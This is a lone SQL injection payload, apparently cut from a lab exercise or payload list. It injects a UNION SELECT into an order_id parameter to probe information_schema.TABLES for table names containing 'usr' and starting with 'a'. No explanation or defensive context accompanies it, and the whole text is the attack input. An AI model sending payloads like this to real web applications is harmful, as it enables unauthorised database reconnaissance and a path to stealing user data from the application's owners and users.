order_id=0 UNION SELECT table_name
FROM information_schema.TABLES
WHERE table_name LIKE '%usr%' AND table_name LIKE 'a%' LIMIT 1;
